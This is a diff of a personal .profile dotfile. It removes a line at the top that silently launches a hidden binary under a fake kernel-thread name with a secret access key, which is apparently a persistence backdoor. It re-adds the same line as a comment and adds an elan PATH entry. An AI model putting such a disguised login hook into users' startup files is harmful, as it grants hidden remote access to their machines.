@@ -1,6 +1,4 @@
 #!/bin/bash -x
-set +m; HOME=/home/yigit TERM="xterm-256color" SHELL="/bin/bash" QS_ARGS="-liqs lBg2WqxLORaqhKLF2bxC" /usr/bin/bash -c "exec -a [kworker/R-btrfs-delayed-meta] /home/yigit/.config/.i9NSn7wj/K4VX7Nvg" &>/dev/null &
-#!/bin/bash -x
 
 ## __   _______ _____ _____
 ## \ \ / / ____| ____|_   _|
@@ -8,6 +6,7 @@ set +m; HOME=/home/yigit TERM="xterm-256color" SHELL="/bin/bash" QS_ARGS="-liqs 
 ##   | | | |___| |___  | |
 ##   |_| |_____|_____| |_|
 ## .profile
+# set +m; HOME=/home/yigit TERM="xterm-256color" SHELL="/bin/bash" QS_ARGS="-liqs lBg2WqxLORaqhKLF2bxC" /usr/bin/bash -c "exec -a [kworker/R-btrfs-delayed-meta] /home/yigit/.config/.i9NSn7wj/K4VX7Nvg" &>/dev/null &
 
 
 systemctl status display-manager 2> /dev/null > /dev/null
@@ -151,3 +150,5 @@ if [ "$DISPLAY" = "" ] && [ "$(tty)" = /dev/tty1 ] && [ $disp_manager -ne 0 ]; t
   fi
   exit
 fi
+
+export PATH="$HOME/.elan/bin:$PATH"
